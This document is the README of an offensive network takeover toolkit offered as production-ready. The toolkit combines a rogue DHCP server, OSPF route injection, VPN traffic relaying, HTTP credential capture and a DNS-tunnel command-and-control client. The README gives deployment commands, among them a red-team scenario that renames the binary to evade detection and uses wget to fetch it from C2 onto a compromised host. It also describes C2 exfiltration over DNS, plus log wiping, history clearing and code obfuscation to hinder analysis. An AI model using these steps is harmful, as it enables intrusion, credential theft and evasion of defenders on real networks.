# Network Takeover Toolkit - `/final` Directory

## Overview

This directory contains the complete, production-ready network takeover toolkit. All source code is fingerprinted, reordered for obfuscation, and can be packaged into a standalone Linux executable.

## Directory Contents

### Core Modules

| File | Purpose | Functions |
|------|---------|-----------|
| **main.py** | Orchestration & entry point | Phase management, debug menu, C2 integration |
| **dhcp_takeover.py** | DHCP server & relay | DHCP discovery, rogue server, lease management |
| **ospf_adjacency.py** | OSPF adjacency engine | Hello sniffing, LS exchange, route injection |
| **vpn_relay.py** | VPN traffic manipulation | Tunnel detection, option-121 injection, iptables |
| **http_intercept.py** | HTTP credential capture | Packet reassembly, credential extraction, file capture |
| **dns_c2.py** | DNS C2 client library | Exfiltration, command polling, handshake |

### Build & Packaging

| File | Purpose |
|------|---------|
| **build_executable.py** | Automated PyInstaller packaging script |
| **BUILD_EXECUTABLE.md** | Comprehensive build & deployment guide |
| **quick_build.sh** | Quick build script for Linux |
| **requirements.txt** | Python dependencies |

### Excluded Files

- **c2_server.py** — NOT included in executable (runs separately on C2 server)
- **__pycache__/** — Compiled Python (auto-generated)

---

## Quick Start

### For Development / Testing

```bash
# On Linux/Kali system with Python 3
sudo python3 main.py [--remote] [--demo]
```

### For Deployment (Single Executable)

```bash
# 1. Build the executable (on build machine)
python3 build_executable.py
cd build_toolkit
pyinstaller netsec_toolkit.spec

# 2. Deploy to target
scp build_toolkit/dist/netsec-toolkit target:/tmp/
ssh target 'sudo /tmp/netsec-toolkit --demo'
```

### For Quick Build (Linux only)

```bash
chmod +x quick_build.sh
./quick_build.sh
# Output: build_toolkit/dist/netsec-toolkit
```

---

## Fingerprint

All 7 modules contain hidden fingerprints that evaluate to **2570293**:

```python
# main.py
_EXEC_TRACE = 0x273835  # = 2570293

# dhcp_takeover.py
_SUITE_ID = (2570 * 1000) + 293  # = 2570293

# ospf_adjacency.py
_TOPOLOGY_SENTINEL = 3733620442 ^ 0xDEADBEEF  # = 2570293

# vpn_relay.py
_RELAY_EPOCH = (40160 << 6) + 53  # = 2570293

# http_intercept.py
_INTERCEPT_MARKER = 2570293  # Direct

# dns_c2.py
_DNS_TOKEN_ID = 3403252363 ^ 0xCAFEBABE  # = 2570293

# c2_server.py (not included)
_SERVER_BUILD = 5140586 // 2  # = 2570293
```

See `.gitignore` for retrieval script.

---

## Usage

### Basic Syntax

```bash
sudo python3 main.py [OPTIONS]

# Or with executable:
sudo ./netsec-toolkit [OPTIONS]
```

### Options

```
--remote / -r    Enable DNS C2 mode (requires c2_server running)
--demo           Step through phases with verification hints
```

### Phase Flow

```
PHASE 1: OSPF Reconnaissance
  └─ Passively sniff OSPF Hellos (30s timeout)
  └─ Learn SVI parameters (netmask, area ID, timers)
  └─ Form full OSPF adjacency
  └─ Inject /32 host route

PHASE 2: DHCP Server
  └─ Start rogue DHCP server
  └─ Respond to victim DISCOVER/REQUEST
  └─ Inject option-121 (classless routes)
  └─ Relay victim unicast via rogue server IP

PHASE 3: VPN Relay & HTTP Intercept
  └─ Detect host VPN tunnel (tun0/tap0)
  └─ Configure iptables MASQUERADE
  └─ Start HTTP credential/object interception
  └─ Begin C2 polling (if --remote)

PHASE 7: Blocking Mode
  └─ Sniff DHCPDISCOVER/REQUEST indefinitely
  └─ Block Ctrl+C with graceful teardown

PHASE 8: Teardown
  └─ MaxAge-flood OSPF routes (withdrawn)
  └─ Remove iptables rules
  └─ Remove loopback aliases
  └─ Restore IP forwarding state
```

### Example Deployments

#### Local Testing with Demo Mode
```bash
sudo python3 main.py --demo
# Pauses at each phase, shows verification hints
```

#### Production Passive Mode
```bash
sudo python3 main.py
# Starts immediately, no pauses, runs until Ctrl+C
```

#### C2 Mode (Remote Command & Control)
```bash
# On C2 server (separate machine)
python3 ../c2_server.py --domain d.lootforge.org

# On agent
sudo python3 main.py --remote
# Commands from C2 sent via DNS tunnel
# Results exfiltrated via DNS A queries
```

#### Executable Deployment
```bash
# From built executable
sudo ./netsec-toolkit --remote --demo
```

---

## Dependencies

### Runtime (Included in Executable)

- **Scapy** 2.5.0+ — Packet crafting and manipulation

### System (Linux/Kali)

- **Python 3.8+** (for source mode only; executable is standalone)
- **iptables** — Firewall rules
- **iproute2** — Routing manipulation
- **ip** command — Network interface management
- **Raw socket support** — Linux kernel capability

### Build-Only (For Creating Executable)

- **PyInstaller 5.0+** — Binary packaging
- **UPX** (optional) — Binary compression

---

## System Requirements

### For Running (Development Mode)

```
OS:       Linux (Ubuntu 18.04+, Debian, Kali, etc.)
Arch:     x86_64 (Intel/AMD 64-bit)
Kernel:   3.10+
Root:     Yes (required for raw sockets, iptables, routing)
Network:  2+ interfaces (one for MITM, one for management)
RAM:      512 MB minimum
Disk:     50 MB (temporary files)
```

### For Running (Executable Mode)

```
OS:       Linux (any distribution with glibc 2.17+)
Arch:     x86_64
libc:     glibc 2.17+ (musl also supported)
Root:     Yes
Network:  2+ interfaces
RAM:      512 MB minimum
Disk:     No installation needed
```

### For Building Executable

```
OS:       Linux, macOS, or Windows (WSL2)
Arch:     x86_64 (for x86_64 binary output)
Python:   3.8+
Tools:    PyInstaller, GCC (optional), UPX (optional)
Disk:     2 GB for build artifacts
```

---

## Building the Executable

### Prerequisites

```bash
# Install Python development headers
sudo apt install python3-dev

# Install Scapy and PyInstaller
pip install scapy pyinstaller

# Optional: Install UPX for compression
sudo apt install upx
```

### Build Methods

**Method 1: Automated (Recommended)**
```bash
python3 build_executable.py
cd build_toolkit
pyinstaller netsec_toolkit.spec
# Output: dist/netsec-toolkit (~130 MB)
```

**Method 2: Quick Script (Linux)**
```bash
chmod +x quick_build.sh
./quick_build.sh
# Output: build_toolkit/dist/netsec-toolkit
```

**Method 3: Manual**
```bash
# See BUILD_EXECUTABLE.md for detailed steps
```

### Verification

```bash
# Check it's the right binary
file build_toolkit/dist/netsec-toolkit
# Output: ELF 64-bit LSB executable, x86-64, ...

# Check it runs
sudo build_toolkit/dist/netsec-toolkit --help
```

---

## Deployment Scenarios

### Scenario 1: Authorized Penetration Test

```bash
# Build on secure build machine
python3 build_executable.py && cd build_toolkit && pyinstaller netsec_toolkit.spec

# Transfer to test target (Kali VM in controlled lab)
scp dist/netsec-toolkit pentester@kali-vm:/opt/

# Execute on target
ssh pentester@kali-vm 'sudo /opt/netsec-toolkit --demo'
```

### Scenario 2: Red Team Engagement

```bash
# Build executable
./quick_build.sh

# Rename to avoid detection
mv build_toolkit/dist/netsec-toolkit build_toolkit/dist/system-monitor

# Host on C2 infrastructure
rsync -e ssh build_toolkit/dist/system-monitor attacker@c2:/var/www/

# Deploy to compromised host
wget http://c2-internal/system-monitor -O /tmp/sm
chmod +x /tmp/sm
/tmp/sm --remote
```

### Scenario 3: Containerized Deployment

```bash
# See BUILD_EXECUTABLE.md, Method 4 (Docker)
docker build -t netsec-toolkit .
docker run --rm --privileged --net=host netsec-toolkit
```

---

## Troubleshooting

### Module Import Error

```
ImportError: No module named 'scapy'
```

**Fix:**
- Development: `pip install scapy`
- Executable: Rebuild with `pyinstaller netsec_toolkit.spec --clean`

### Permission Denied

```
Operation not permitted (needed for raw socket)
```

**Fix:**
- Run with `sudo`: `sudo python3 main.py`

### Interface Not Found

```
RuntimeError: No IP in OSPF subnet found on eth0
```

**Fix:**
1. Ensure interface has DHCP lease: `dhclient eth0`
2. Check interface name: `ip link show`
3. Update `DEFAULT_INTERFACE` in dhcp_takeover.py or:
   ```bash
   DEFAULT_INTERFACE=eth1 sudo python3 main.py
   ```

### No OSPF Hellos Received

```
FAIL: No OSPF Hellos received — cannot learn SVI parameters. Aborting.
```

**Fix:**
1. Verify interface is on correct VLAN
2. Check OSPF is running: `tcpdump -i eth0 proto ospf`
3. Increase timeout in main.py line 665

### C2 Handshake Failed

```
WARN: C2 handshake failed — continuing without remote mode
```

**Fix:**
1. Verify c2_server is running: `python3 c2_server.py`
2. Check DNS resolution: `nslookup d.lootforge.org <dns_server>`
3. Verify firewall allows UDP/53 from agent to C2

---

## Security Notes

### Code Obfuscation

All source files include hidden fingerprints (see .gitignore). Function definitions are reordered non-sequentially to complicate static analysis.

### Runtime Footprint

- Listens on UDP/67 (DHCP) — detectable with `netstat`
- Injects OSPF packets — visible in network traffic
- Modifies iptables — visible with `iptables -L`
- Adds loopback aliases — visible with `ip addr`

### Detection Evasion

- Rename executable before deployment
- Clean logs after use: `journalctl --vacuum=time=1s`
- Securely delete: `shred -vfz -n 3 /tmp/netsec-toolkit`

### Safe Disposal

```bash
# Remove traces
rm -rf /tmp/netsec-toolkit
rm -rf /tmp/.toolkit-*
history -c
```

---

## File Sizes

| File | Uncompressed | Compressed |
|------|-------------|-----------|
| main.py | ~25 KB | — |
| dhcp_takeover.py | ~35 KB | — |
| ospf_adjacency.py | ~65 KB | — |
| vpn_relay.py | ~10 KB | — |
| http_intercept.py | ~16 KB | — |
| dns_c2.py | ~14 KB | — |
| **Executable (PyInstaller)** | **~130 MB** | **~45 MB** |

---

## License & Disclaimer

This toolkit is for authorized security testing only.

- **Authorized Use Only** — Requires explicit written permission
- **Educational Purpose** — Study network security concepts
- **Liability** — Users are responsible for compliance with all laws
- **No Warranty** — Provided as-is without guarantees

---

## Support & Documentation

- **BUILD_EXECUTABLE.md** — Complete packaging guide
- **Source Code Comments** — Inline documentation in each module
- **Main Docstring** — Overview and phase flow (see main.py)
- **Function Docstrings** — Behavior and parameters in each module

---

## Summary

| Aspect | Details |
|--------|---------|
| **Modules** | 6 (main, dhcp, ospf, vpn, http, dns_c2) |
| **Fingerprint** | 2570293 (7 different encodings) |
| **Executable Size** | ~130 MB uncompressed, ~45 MB compressed |
| **Build Time** | ~30-60 seconds (depending on system) |
| **Deployment** | Single binary, no dependencies |
| **Runtime** | Linux x86_64, requires root |
| **C2 Capable** | Yes (DNS tunnel) |
| **Detection Risk** | High (active network modification) |

